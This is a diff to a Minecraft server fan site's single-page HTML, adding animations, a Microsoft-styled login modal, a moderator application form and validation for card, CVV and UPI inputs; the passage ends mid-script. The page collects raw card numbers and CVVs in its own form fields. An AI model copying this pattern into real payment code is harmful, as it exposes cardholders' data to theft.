@@ -207,8 +207,36 @@
             }
         }
 
+        @keyframes slideInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes glowPulse {
+            0%, 100% {
+                box-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
+            }
+            50% {
+                box-shadow: 0 0 40px rgba(0, 212, 255, 0.8);
+            }
+        }
+
         .slide-up {
             animation: slideInUp 0.6s ease-out;
+        }
+
+        .slide-down {
+            animation: slideInDown 0.6s ease-out;
+        }
+
+        .glow-pulse {
+            animation: glowPulse 2s infinite;
         }
 
         /* Server Status */
@@ -256,6 +284,29 @@
             color: rgba(255, 255, 255, 0.5);
         }
 
+        .form-input.error {
+            border-color: #EF4444;
+            box-shadow: 0 0 10px rgba(239, 68, 68, 0.3);
+        }
+
+        .form-input.success {
+            border-color: #10B981;
+            box-shadow: 0 0 10px rgba(16, 185, 129, 0.3);
+        }
+
+        .validation-message {
+            font-size: 0.8rem;
+            margin-top: 0.5rem;
+        }
+
+        .validation-message.error {
+            color: #EF4444;
+        }
+
+        .validation-message.success {
+            color: #10B981;
+        }
+
         /* Modal */
         .modal {
             display: none;
@@ -267,6 +318,7 @@
             height: 100%;
             background-color: rgba(0, 0, 0, 0.8);
             backdrop-filter: blur(10px);
+            animation: fadeIn 0.3s ease-in-out;
         }
 
         .modal-content {
@@ -277,6 +329,60 @@
             width: 90%;
             max-width: 500px;
             border: 1px solid rgba(0, 212, 255, 0.2);
+            animation: slideInDown 0.4s ease-out;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .modal-content:before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--primary-cyan), var(--accent-purple));
+        }
+
+        /* Microsoft Login Special Modal */
+        .microsoft-modal {
+            background: linear-gradient(135deg, #1A1A2E 0%, #16213E 100%);
+            border: 2px solid rgba(0, 212, 255, 0.3);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+        }
+
+        .microsoft-btn {
+            background: linear-gradient(135deg, #0078D4, #106EBE);
+            border: none;
+            padding: 15px 20px;
+            border-radius: 8px;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 120, 212, 0.4);
+        }
+
+        .microsoft-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 120, 212, 0.6);
+        }
+
+        /* Payment Methods */
+        .payment-method {
+            border: 2px solid rgba(0, 212, 255, 0.2);
+            border-radius: 8px;
+            padding: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+
+        .payment-method:hover,
+        .payment-method.selected {
+            border-color: var(--primary-cyan);
+            background: rgba(0, 212, 255, 0.1);
+            transform: scale(1.05);
         }
 
         /* Responsive */
@@ -288,6 +394,11 @@
             .loading-bar {
                 width: 250px;
             }
+
+            .modal-content {
+                width: 95%;
+                margin: 10% auto;
+            }
         }
 
         /* Hidden class */
@@ -295,19 +406,53 @@
             display: none !important;
         }
 
-        /* Payment Methods */
-        .payment-method {
-            border: 2px solid rgba(0, 212, 255, 0.2);
-            border-radius: 8px;
-            padding: 1rem;
-            cursor: pointer;
-            transition: all 0.3s ease;
+        /* Card animations */
+        .card-hover {
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        .payment-method:hover,
-        .payment-method.selected {
-            border-color: var(--primary-cyan);
-            background: rgba(0, 212, 255, 0.1);
+        .card-hover:hover {
+            transform: translateY(-8px) scale(1.02);
+            box-shadow: 0 20px 40px rgba(0, 212, 255, 0.2);
+        }
+
+        /* Particle effects */
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: var(--primary-cyan);
+            border-radius: 50%;
+            pointer-events: none;
+            animation: particleFloat 4s linear infinite;
+        }
+
+        @keyframes particleFloat {
+            0% {
+                transform: translateY(100vh) rotate(0deg);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-100vh) rotate(360deg);
+                opacity: 0;
+            }
+        }
+
+        /* Loading spinner */
+        .spinner {
+            border: 2px solid rgba(0, 212, 255, 0.2);
+            border-top: 2px solid var(--primary-cyan);
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 8px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
@@ -377,7 +522,7 @@
                 <div class="bg-black bg-opacity-50 rounded-lg p-6 mb-8 inline-block slide-up">
                     <p class="text-lg mb-2">Server IP:</p>
                     <div class="flex items-center justify-center space-x-4">
-                        <code class="text-2xl text-cyan-400 font-mono bg-gray-800 px-4 py-2 rounded">Coming Soon</code>
+                        <code class="text-2xl text-cyan-400 font-mono bg-gray-800 px-4 py-2 rounded">playpikzels.fun</code>
                         <button onclick="copyIP()" class="neon-btn text-sm">
                             <i class="fas fa-copy"></i> Copy
                         </button>
@@ -392,7 +537,7 @@
                         <div class="text-cyan-400 font-bold" id="player-count">0/100 Players</div>
                     </div>
                 </div>
-                <button onclick="joinServer()" class="neon-btn text-xl px-8 py-4 slide-up">
+                <button onclick="joinServer()" class="neon-btn text-xl px-8 py-4 slide-up glow-pulse">
                     <i class="fas fa-play mr-2"></i> JOIN NOW
                 </button>
             </div>
@@ -410,13 +555,13 @@
                         <p class="text-lg mb-6">
                             Founded with a vision to create the ultimate multiplayer experience, we've built a network that combines classic gameplay with innovative features that keep you engaged for hours.
                         </p>
-                        <div class="bg-gray-800 rounded-lg p-6">
+                        <div class="bg-gray-800 rounded-lg p-6 card-hover">
                             <h3 class="text-xl font-bold mb-4 text-cyan-400">Our Mission</h3>
                             <p>To provide the most engaging, fair, and fun Minecraft server experience while building a strong community of passionate players.</p>
                         </div>
                     </div>
                     <div class="slide-up">
-                        <div class="bg-gray-800 rounded-lg p-6">
+                        <div class="bg-gray-800 rounded-lg p-6 card-hover">
                             <h3 class="text-xl font-bold mb-4 text-cyan-400">Meet Our Team</h3>
                             <div class="space-y-4">
                                 <div class="flex items-center">
@@ -437,14 +582,19 @@
                                         <p class="text-sm text-gray-400">Administrator</p>
                                     </div>
                                 </div>
-                                <div class="flex items-center">
-                                    <div class="w-12 h-12 bg-gradient-to-r from-blue-400 to-purple-500 rounded-full flex items-center justify-center mr-4">
-                                        <i class="fas fa-user-plus text-white"></i>
+                                <div class="flex items-center justify-between">
+                                    <div class="flex items-center">
+                                        <div class="w-12 h-12 bg-gradient-to-r from-blue-400 to-purple-500 rounded-full flex items-center justify-center mr-4">
+                                            <i class="fas fa-user-plus text-white"></i>
+                                        </div>
+                                        <div>
+                                            <p class="font-bold">Moderator Positions</p>
+                                            <p class="text-sm text-gray-400">Applications Open!</p>
+                                        </div>
                                     </div>
-                                    <div>
-                                        <p class="font-bold">Moderator Positions</p>
-                                        <p class="text-sm text-gray-400">Applications Open - Apply via Email!</p>
-                                    </div>
+                                    <button onclick="openModeratorApplication()" class="neon-btn text-sm">
+                                        Apply Now
+                                    </button>
                                 </div>
                             </div>
                         </div>
@@ -458,9 +608,9 @@
             <div class="container mx-auto">
                 <h2 class="text-4xl font-bold orbitron text-center mb-12 glow-text">Game Modes</h2>
                 <div class="grid md:grid-cols-3 gap-8">
-                    <div class="game-card slide-up">
+                    <div class="game-card slide-up card-hover">
                         <div class="text-center">
-                            <div class="w-16 h-16 bg-red-500 rounded-full flex items-center justify-center mx-auto mb-4">
+                            <div class="w-16 h-16 bg-red-500 rounded-full flex items-center justify-center mx-auto mb-4 glow-pulse">
                                 <i class="fas fa-bed text-2xl text-white"></i>
                             </div>
                             <h3 class="text-xl font-bold mb-4 text-red-400">BedWars</h3>
@@ -470,9 +620,9 @@
                             <button onclick="selectGameMode('bedwars')" class="neon-btn w-full">Play BedWars</button>
                         </div>
                     </div>
-                    <div class="game-card slide-up">
+                    <div class="game-card slide-up card-hover">
                         <div class="text-center">
-                            <div class="w-16 h-16 bg-purple-500 rounded-full flex items-center justify-center mx-auto mb-4">
+                            <div class="w-16 h-16 bg-purple-500 rounded-full flex items-center justify-center mx-auto mb-4 glow-pulse">
                                 <i class="fas fa-heart text-2xl text-white"></i>
                             </div>
                             <h3 class="text-xl font-bold mb-4 text-purple-400">Lifesteal SMP</h3>
@@ -482,9 +632,9 @@
                             <button onclick="selectGameMode('lifesteal')" class="neon-btn w-full">Join Lifesteal</button>
                         </div>
                     </div>
-                    <div class="game-card slide-up">
+                    <div class="game-card slide-up card-hover">
                         <div class="text-center">
-                            <div class="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
+                            <div class="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4 glow-pulse">
                                 <i class="fas fa-tree text-2xl text-white"></i>
                             </div>
                             <h3 class="text-xl font-bold mb-4 text-green-400">Survival</h3>
@@ -503,7 +653,7 @@
             <div class="container mx-auto">
                 <h2 class="text-4xl font-bold orbitron text-center mb-12 glow-text">Leaderboards</h2>
                 <div class="grid md:grid-cols-2 gap-8">
-                    <div class="bg-gray-800 rounded-lg p-6 slide-up">
+                    <div class="bg-gray-800 rounded-lg p-6 slide-up card-hover">
                         <h3 class="text-2xl font-bold mb-6 text-red-400 flex items-center">
                             <i class="fas fa-bed mr-3"></i>BedWars Champions
                         </h3>
@@ -534,7 +684,7 @@
                             </div>
                         </div>
                     </div>
-                    <div class="bg-gray-800 rounded-lg p-6 slide-up">
+                    <div class="bg-gray-800 rounded-lg p-6 slide-up card-hover">
                         <h3 class="text-2xl font-bold mb-6 text-purple-400 flex items-center">
                             <i class="fas fa-heart mr-3"></i>Lifesteal Legends
                         </h3>
@@ -575,9 +725,9 @@
                 <h2 class="text-4xl font-bold orbitron text-center mb-12 glow-text">Server Store</h2>
                 <div class="grid md:grid-cols-3 gap-8">
                     <!-- Ranks -->
-                    <div class="store-item slide-up">
+                    <div class="store-item slide-up card-hover">
                         <div class="text-center">
-                            <div class="w-16 h-16 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-full flex items-center justify-center mx-auto mb-4">
+                            <div class="w-16 h-16 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-full flex items-center justify-center mx-auto mb-4 glow-pulse">
                                 <i class="fas fa-star text-2xl text-white"></i>
                             </div>
                             <h3 class="text-xl font-bold mb-2 text-yellow-400">VIP Rank</h3>
@@ -591,9 +741,9 @@
                             <button onclick="purchaseItem('vip', 9.99)" class="neon-btn w-full">Purchase VIP</button>
                         </div>
                     </div>
-                    <div class="store-item slide-up">
+                    <div class="store-item slide-up card-hover">
                         <div class="text-center">
-                            <div class="w-16 h-16 bg-gradient-to-r from-cyan-400 to-blue-500 rounded-full flex items-center justify-center mx-auto mb-4">
+                            <div class="w-16 h-16 bg-gradient-to-r from-cyan-400 to-blue-500 rounded-full flex items-center justify-center mx-auto mb-4 glow-pulse">
                                 <i class="fas fa-gem text-2xl text-white"></i>
                             </div>
                             <h3 class="text-xl font-bold mb-2 text-cyan-400">MVP Rank</h3>
@@ -608,9 +758,9 @@
                             <button onclick="purchaseItem('mvp', 19.99)" class="neon-btn w-full">Purchase MVP</button>
                         </div>
                     </div>
-                    <div class="store-item slide-up">
+                    <div class="store-item slide-up card-hover">
                         <div class="text-center">
-                            <div class="w-16 h-16 bg-gradient-to-r from-purple-400 to-pink-500 rounded-full flex items-center justify-center mx-auto mb-4">
+                            <div class="w-16 h-16 bg-gradient-to-r from-purple-400 to-pink-500 rounded-full flex items-center justify-center mx-auto mb-4 glow-pulse">
                                 <i class="fas fa-crown text-2xl text-white"></i>
                             </div>
                             <h3 class="text-xl font-bold mb-2 text-purple-400">MVP+ Rank</h3>
@@ -631,25 +781,25 @@
                 <div class="mt-12">
                     <h3 class="text-2xl font-bold text-center mb-8 text-cyan-400">Additional Items</h3>
                     <div class="grid md:grid-cols-4 gap-6">
-                        <div class="store-item text-center">
+                        <div class="store-item text-center card-hover">
                             <i class="fas fa-box text-3xl text-yellow-400 mb-4"></i>
                             <h4 class="font-bold mb-2">Mystery Crate Key</h4>
                             <p class="text-cyan-400 text-xl font-bold mb-4">$4.99</p>
                             <button onclick="purchaseItem('crate_key', 4.99)" class="neon-btn text-sm w-full">Buy Key</button>
                         </div>
-                        <div class="store-item text-center">
+                        <div class="store-item text-center card-hover">
                             <i class="fas fa-tshirt text-3xl text-pink-400 mb-4"></i>
                             <h4 class="font-bold mb-2">Cosmetic Pack</h4>
                             <p class="text-cyan-400 text-xl font-bold mb-4">$7.99</p>
                             <button onclick="purchaseItem('cosmetic_pack', 7.99)" class="neon-btn text-sm w-full">Buy Pack</button>
                         </div>
-                        <div class="store-item text-center">
+                        <div class="store-item text-center card-hover">
                             <i class="fas fa-coins text-3xl text-green-400 mb-4"></i>
                             <h4 class="font-bold mb-2">1000 Coins</h4>
                             <p class="text-cyan-400 text-xl font-bold mb-4">$2.99</p>
                             <button onclick="purchaseItem('coins_1000', 2.99)" class="neon-btn text-sm w-full">Buy Coins</button>
                         </div>
-                        <div class="store-item text-center">
+                        <div class="store-item text-center card-hover">
                             <i class="fas fa-shield-alt text-3xl text-blue-400 mb-4"></i>
                             <h4 class="font-bold mb-2">Protection Boost</h4>
                             <p class="text-cyan-400 text-xl font-bold mb-4">$1.99</p>
@@ -665,9 +815,9 @@
             <div class="container mx-auto">
                 <h2 class="text-4xl font-bold orbitron text-center mb-12 glow-text">Downloads</h2>
                 <div class="grid md:grid-cols-2 gap-8">
-                    <div class="bg-gray-800 rounded-lg p-8 slide-up">
+                    <div class="bg-gray-800 rounded-lg p-8 slide-up card-hover">
                         <div class="text-center">
-                            <div class="w-20 h-20 bg-gradient-to-r from-green-400 to-blue-500 rounded-full flex items-center justify-center mx-auto mb-6">
+                            <div class="w-20 h-20 bg-gradient-to-r from-green-400 to-blue-500 rounded-full flex items-center justify-center mx-auto mb-6 glow-pulse">
                                 <i class="fas fa-cube text-3xl text-white"></i>
                             </div>
                             <h3 class="text-2xl font-bold mb-4 text-green-400">Resource Packs</h3>
@@ -679,9 +829,9 @@
                             </button>
                         </div>
                     </div>
-                    <div class="bg-gray-800 rounded-lg p-8 slide-up">
+                    <div class="bg-gray-800 rounded-lg p-8 slide-up card-hover">
                         <div class="text-center">
-                            <div class="w-20 h-20 bg-gradient-to-r from-purple-400 to-pink-500 rounded-full flex items-center justify-center mx-auto mb-6">
+                            <div class="w-20 h-20 bg-gradient-to-r from-purple-400 to-pink-500 rounded-full flex items-center justify-center mx-auto mb-6 glow-pulse">
                                 <i class="fas fa-cogs text-3xl text-white"></i>
                             </div>
                             <h3 class="text-2xl font-bold mb-4 text-purple-400">OG MODPACK</h3>
@@ -699,19 +849,19 @@
                 <div class="mt-12">
                     <h3 class="text-2xl font-bold text-center mb-8 text-cyan-400">Additional Tools</h3>
                     <div class="grid md:grid-cols-3 gap-6">
-                        <div class="bg-gray-800 rounded-lg p-6 text-center">
+                        <div class="bg-gray-800 rounded-lg p-6 text-center card-hover">
                             <i class="fas fa-map text-3xl text-blue-400 mb-4"></i>
                             <h4 class="font-bold mb-2">World Maps</h4>
                             <p class="text-sm text-gray-400 mb-4">Download offline versions of our server worlds</p>
                             <button onclick="downloadResource('world_maps')" class="neon-btn text-sm w-full">Download</button>
                         </div>
-                        <div class="bg-gray-800 rounded-lg p-6 text-center">
+                        <div class="bg-gray-800 rounded-lg p-6 text-center card-hover">
                             <i class="fas fa-palette text-3xl text-pink-400 mb-4"></i>
                             <h4 class="font-bold mb-2">Custom Skins</h4>
                             <p class="text-sm text-gray-400 mb-4">Exclusive skins for Pikzels Network players</p>
                             <button onclick="downloadResource('custom_skins')" class="neon-btn text-sm w-full">Download</button>
                         </div>
-                        <div class="bg-gray-800 rounded-lg p-6 text-center">
+                        <div class="bg-gray-800 rounded-lg p-6 text-center card-hover">
                             <i class="fas fa-book text-3xl text-yellow-400 mb-4"></i>
                             <h4 class="font-bold mb-2">Guides & Tutorials</h4>
                             <p class="text-sm text-gray-400 mb-4">Complete guides for all our game modes</p>
@@ -733,10 +883,12 @@
                             <div>
                                 <label class="block text-sm font-bold mb-2">Name *</label>
                                 <input type="text" id="contact-name" class="form-input" placeholder="Your Name" required>
+                                <div id="name-validation" class="validation-message"></div>
                             </div>
                             <div>
                                 <label class="block text-sm font-bold mb-2">Email *</label>
                                 <input type="email" id="contact-email" class="form-input" placeholder="your@email.com" required>
+                                <div id="email-validation" class="validation-message"></div>
                             </div>
                             <div>
                                 <label class="block text-sm font-bold mb-2">Subject *</label>
@@ -748,12 +900,14 @@
                                     <option value="report">Report a Player</option>
                                     <option value="suggestion">Server Suggestion</option>
                                 </select>
+                                <div id="subject-validation" class="validation-message"></div>
                             </div>
                             <div>
                                 <label class="block text-sm font-bold mb-2">Message *</label>
                                 <textarea id="contact-message" class="form-input h-32" placeholder="Your message here..." required></textarea>
+                                <div id="message-validation" class="validation-message"></div>
                             </div>
-                            <button type="submit" class="neon-btn w-full">
+                            <button type="submit" id="contact-submit" class="neon-btn w-full">
                                 <i class="fas fa-paper-plane mr-2"></i>Send Message
                             </button>
                         </form>
@@ -762,7 +916,7 @@
                     <div class="slide-up">
                         <h3 class="text-2xl font-bold mb-6 text-cyan-400">Connect With Us</h3>
                         <div class="space-y-6">
-                            <div class="bg-gray-800 rounded-lg p-6">
+                            <div class="bg-gray-800 rounded-lg p-6 card-hover">
                                 <h4 class="font-bold mb-4 flex items-center">
                                     <i class="fas fa-envelope mr-3 text-cyan-400"></i>Email Support
                                 </h4>
@@ -770,7 +924,7 @@
                                 <a href="mailto:Pikzelsnetwork@gmail.com" class="text-cyan-400 hover:text-cyan-300">Pikzelsnetwork@gmail.com</a>
                             </div>
                             
-                            <div class="bg-gray-800 rounded-lg p-6">
+                            <div class="bg-gray-800 rounded-lg p-6 card-hover">
                                 <h4 class="font-bold mb-4 flex items-center">
                                     <i class="fab fa-discord mr-3 text-purple-400"></i>Discord Server
                                 </h4>
@@ -778,12 +932,15 @@
                                 <p class="text-yellow-400 font-bold">Coming Soon!</p>
                             </div>
 
-                            <div class="bg-gray-800 rounded-lg p-6">
+                            <div class="bg-gray-800 rounded-lg p-6 card-hover">
                                 <h4 class="font-bold mb-4 flex items-center">
                                     <i class="fas fa-user-shield mr-3 text-green-400"></i>Staff Applications
                                 </h4>
                                 <p class="text-gray-300 mb-3">Interested in becoming a moderator?</p>
-                                <p class="text-sm text-gray-400">Email us at Pikzelsnetwork@gmail.com with your application!</p>
+                                <p class="text-sm text-gray-400 mb-4">Email us at Pikzelsnetwork@gmail.com with your application!</p>
+                                <button onclick="openModeratorApplication()" class="neon-btn text-sm w-full">
+                                    Apply Now
+                                </button>
                             </div>
                         </div>
 
@@ -791,16 +948,16 @@
                         <div class="mt-8">
                             <h3 class="text-2xl font-bold mb-6 text-cyan-400">Frequently Asked Questions</h3>
                             <div class="space-y-4">
-                                <div class="bg-gray-800 rounded-lg p-4">
+                                <div class="bg-gray-800 rounded-lg p-4 card-hover">
                                     <button class="w-full text-left font-bold flex justify-between items-center" onclick="toggleFAQ(1)">
                                         How do I join the server?
                                         <i class="fas fa-chevron-down" id="faq-icon-1"></i>
                                     </button>
                                     <div id="faq-answer-1" class="hidden mt-3 text-gray-300">
-                                        The server IP will be announced soon! Stay tuned to our social media for updates.
+                                        Use the server IP: playpikzels.fun to connect to our server. Make sure you're using Minecraft version 1.8-1.20.x
                                     </div>
                                 </div>
-                                <div class="bg-gray-800 rounded-lg p-4">
+                                <div class="bg-gray-800 rounded-lg p-4 card-hover">
                                     <button class="w-full text-left font-bold flex justify-between items-center" onclick="toggleFAQ(2)">
                                         What Minecraft version is supported?
                                         <i class="fas fa-chevron-down" id="faq-icon-2"></i>
@@ -809,7 +966,7 @@
                                         We support Minecraft versions 1.8 to 1.20.x with optimal performance on 1.19+
                                     </div>
                                 </div>
-                                <div class="bg-gray-800 rounded-lg p-4">
+                                <div class="bg-gray-800 rounded-lg p-4 card-hover">
                                     <button class="w-full text-left font-bold flex justify-between items-center" onclick="toggleFAQ(3)">
                                         How do I apply for staff?
                                         <i class="fas fa-chevron-down" id="faq-icon-3"></i>
@@ -854,7 +1011,7 @@
                 <div>
                     <h4 class="font-bold mb-4 text-cyan-400">Server Info</h4>
                     <ul class="space-y-2 text-gray-400">
-                        <li>IP: Coming Soon</li>
+                        <li>IP: playpikzels.fun</li>
                         <li>Version: 1.8-1.20.x</li>
                         <li>Max Players: 100</li>
                         <li>Uptime: 99.9%</li>
@@ -869,12 +1026,12 @@
 
     <!-- Login Modal -->
     <div id="login-modal" class="modal">
-        <div class="modal-content">
+        <div class="modal-content microsoft-modal">
             <span class="close float-right text-2xl cursor-pointer" onclick="closeLoginModal()">&times;</span>
             <h2 class="text-2xl font-bold mb-6 text-center orbitron glow-text">Player Login</h2>
             
             <!-- Microsoft Login -->
-            <button id="microsoft-login-btn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg mb-4 transition-colors">
+            <button id="microsoft-login-btn" class="microsoft-btn w-full mb-4">
                 <i class="fab fa-microsoft mr-2"></i>Login with Microsoft
             </button>
             
@@ -887,6 +1044,7 @@
                 <div>
                     <label class="block text-sm font-bold mb-2">Minecraft Username</label>
                     <input type="text" id="login-username" class="form-input" placeholder="Enter your Minecraft username" required>
+                    <div id="username-validation" class="validation-message"></div>
                 </div>
                 <button type="submit" class="neon-btn w-full">
                     <i class="fas fa-sign-in-alt mr-2"></i>Login
@@ -919,7 +1077,7 @@
                         <i class="fab fa-paypal mr-2"></i>PayPal
                     </div>
                     <div class="payment-method" data-method="razorpay">
-                        <i class="fas fa-wallet mr-2"></i>Razorpay
+                        <i class="fas fa-wallet mr-2"></i>Razorpay/UPI
                     </div>
                     <div class="payment-method" data-method="crypto">
                         <i class="fab fa-bitcoin mr-2"></i>Crypto
@@ -931,22 +1089,26 @@
             <div id="stripe-form" class="payment-form hidden">
                 <form class="space-y-4">
                     <div>
-                        <label class="block text-sm font-bold mb-2">Card Number</label>
-                        <input type="text" class="form-input" placeholder="1234 5678 9012 3456" maxlength="19">
+                        <label class="block text-sm font-bold mb-2">Card Number *</label>
+                        <input type="text" id="card-number" class="form-input" placeholder="1234 5678 9012 3456" maxlength="19">
+                        <div id="card-validation" class="validation-message"></div>
                     </div>
                     <div class="grid grid-cols-2 gap-4">
                         <div>
-                            <label class="block text-sm font-bold mb-2">Expiry Date</label>
-                            <input type="text" class="form-input" placeholder="MM/YY" maxlength="5">
+                            <label class="block text-sm font-bold mb-2">Expiry Date *</label>
+                            <input type="text" id="card-expiry" class="form-input" placeholder="MM/YY" maxlength="5">
+                            <div id="expiry-validation" class="validation-message"></div>
                         </div>
                         <div>
-                            <label class="block text-sm font-bold mb-2">CVV</label>
-                            <input type="text" class="form-input" placeholder="123" maxlength="4">
+                            <label class="block text-sm font-bold mb-2">CVV *</label>
+                            <input type="text" id="card-cvv" class="form-input" placeholder="123" maxlength="4">
+                            <div id="cvv-validation" class="validation-message"></div>
                         </div>
                     </div>
                     <div>
-                        <label class="block text-sm font-bold mb-2">Cardholder Name</label>
-                        <input type="text" class="form-input" placeholder="John Doe">
+                        <label class="block text-sm font-bold mb-2">Cardholder Name *</label>
+                        <input type="text" id="card-name" class="form-input" placeholder="John Doe">
+                        <div id="cardholder-validation" class="validation-message"></div>
                     </div>
                 </form>
             </div>
@@ -961,8 +1123,9 @@
             <div id="razorpay-form" class="payment-form hidden">
                 <form class="space-y-4">
                     <div>
-                        <label class="block text-sm font-bold mb-2">UPI ID</label>
-                        <input type="text" class="form-input" placeholder="example@upi">
+                        <label class="block text-sm font-bold mb-2">UPI ID *</label>
+                        <input type="text" id="upi-id" class="form-input" placeholder="example@paytm">
+                        <div id="upi-validation" class="validation-message"></div>
                     </div>
                     <p class="text-sm text-gray-400">Or pay using cards, netbanking, and wallets</p>
                 </form>
@@ -973,9 +1136,9 @@
                     <i class="fab fa-bitcoin text-6xl text-yellow-500 mb-4"></i>
                     <p class="text-gray-300 mb-4">Select your preferred cryptocurrency:</p>
                     <div class="grid grid-cols-3 gap-4">
-                        <button class="neon-btn text-sm">Bitcoin</button>
-                        <button class="neon-btn text-sm">Ethereum</button>
-                        <button class="neon-btn text-sm">USDT</button>
+                        <button class="neon-btn text-sm" onclick="selectCrypto('bitcoin')">Bitcoin</button>
+                        <button class="neon-btn text-sm" onclick="selectCrypto('ethereum')">Ethereum</button>
+                        <button class="neon-btn text-sm" onclick="selectCrypto('usdt')">USDT</button>
                     </div>
                 </div>
             </div>
@@ -986,12 +1149,142 @@
         </div>
     </div>
 
+    <!-- Moderator Application Modal -->
+    <div id="moderator-modal" class="modal">
+        <div class="modal-content">
+            <span class="close float-right text-2xl cursor-pointer" onclick="closeModeratorModal()">&times;</span>
+            <h2 class="text-2xl font-bold mb-6 text-center orbitron glow-text">Moderator Application</h2>
+            
+            <form id="moderator-form" class="space-y-4">
+                <div>
+                    <label class="block text-sm font-bold mb-2">Minecraft Username *</label>
+                    <input type="text" id="mod-username" class="form-input" placeholder="Your Minecraft username" required>
+                </div>
+                <div>
+                    <label class="block text-sm font-bold mb-2">Email Address *</label>
+                    <input type="email" id="mod-email" class="form-input" placeholder="your@email.com" required>
+                </div>
+                <div>
+                    <label class="block text-sm font-bold mb-2">Discord Username</label>
+                    <input type="text" id="mod-discord" class="form-input" placeholder="YourName#1234">
+                </div>
+                <div>
+                    <label class="block text-sm font-bold mb-2">Age *</label>
+                    <input type="number" id="mod-age" class="form-input" placeholder="16" min="13" required>
+                </div>
+                <div>
+                    <label class="block text-sm font-bold mb-2">Previous Experience *</label>
+                    <textarea id="mod-experience" class="form-input h-24" placeholder="Tell us about your previous moderation experience..." required></textarea>
+                </div>
+                <div>
+                    <label class="block text-sm font-bold mb-2">Why do you want to be a moderator? *</label>
+                    <textarea id="mod-reason" class="form-input h-24" placeholder="Explain why you want to join our staff team..." required></textarea>
+                </div>
+                <div>
+                    <label class="block text-sm font-bold mb-2">Available Time (hours per day) *</label>
+                    <input type="number" id="mod-time" class="form-input" placeholder="4" min="1" max="16" required>
+                </div>
+                <button type="submit" class="neon-btn w-full">
+                    <i class="fas fa-paper-plane mr-2"></i>Submit Application
+                </button>
+            </form>
+        </div>
+    </div>
+
     <script>
         // Global Variables
         let currentUser = null;
         let onlinePlayers = 0;
         let selectedPaymentMethod = null;
         let currentPurchase = null;
+
+        // Validation Functions
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+
+        function validateCardNumber(number) {
+            // Remove spaces and non-digits
+            const cleanNumber = number.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            
+            // Check if it's a valid length
+            if (cleanNumber.length < 13 || cleanNumber.length > 19) {
+                return false;
+            }
+            
+            // Luhn Algorithm
+            let sum = 0;
+            let alternate = false;
+            
+            for (let i = cleanNumber.length - 1; i >= 0; i--) {
+                let n = parseInt(cleanNumber.charAt(i), 10);
+                
+                if (alternate) {
+                    n *= 2;
+                    if (n > 9) {
+                        n = (n % 10) + 1;
+                    }
+                }
+                sum += n;
+                alternate = !alternate;
+            }
+            
+            return (sum % 10) === 0;
+        }
+
+        function validateUPI(upiId) {
+            const upiRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z][a-zA-Z0-9._-]*$/;
+            return upiRegex.test(upiId);
+        }
+
+        function validateExpiry(expiry) {
+            const regex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
+            if (!regex.test(expiry)) return false;
+            
+            const [month, year] = expiry.split('/');
+            const now = new Date();
+            const currentYear = now.getFullYear() % 100;
+            const currentMonth = now.getMonth() + 1;
+            
+            const expiryYear = parseInt(year);
+            const expiryMonth = parseInt(month);
+            
+            if (expiryYear < currentYear || (expiryYear === currentYear && expiryMonth < currentMonth)) {
+                return false;
+            }
+            
+            return true;
+        }
+
+        function validateCVV(cvv) {
+            return /^[0-9]{3,4}$/.test(cvv);
+        }
+
+        function showValidation(elementId, message, isError = true) {
+            const element = document.getElementById(elementId);
+            const input = element.previousElementSibling;
+            
+            if (isError) {
+                element.textContent = message;
+                element.className = 'validation-message error';
+                input.classList.add('error');
+                input.classList.remove('success');
+            } else {
+                element.textContent = message;
+                element.className = 'validation-message success';
+                input.classList.add('success');
+                input.classList.remove('error');
+            }
+        }
+
+        function clearValidation(elementId) {
+            const element = document.getElementById(elementId);
+            const input = element.previousElementSibling;
+            element.textContent = '';
+            element.className = 'validation-message';
+            input.classList.remove('error', 'success');
+        }
 
         // Loading Screen Animation
         window.addEventListener('load', function() {
@@ -1008,12 +1301,98 @@
             initializeCharts();
             updatePlayerCount();
             initializePaymentHandlers();
+            initializeFormValidation();
             
             // Update player count every 30 seconds
             setInterval(updatePlayerCount, 30000);
             
             // Initialize scroll animations
             initializeScrollAnimations();
+        }
+
+        // Initialize Form Validation
+        function initializeFormValidation() {
+            // Card number formatting and validation
+            const cardNumberInput = document.getElementById('card-number');
+            if (cardNumberInput) {
+                cardNumberInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                    let formattedValue = value.match(/.{1,4}/g)?.join(' ') || '';
+                    
+                    e.target.value = formattedValue;
+                    
+                    if (value.length >= 13) {
+                        if (validateCardNumber(value)) {
+                            showValidation('card-validation', '✓ Valid card number', false);
+                        } else {
+                            showValidation('card-validation', '✗ Invalid card number');
+                        }
+                    } else if (value.length > 0) {
+                        showValidation('card-validation', 'Enter complete card number');
+                    } else {
+                        clearValidation('card-validation');
+                    }
+                });
+            }
+
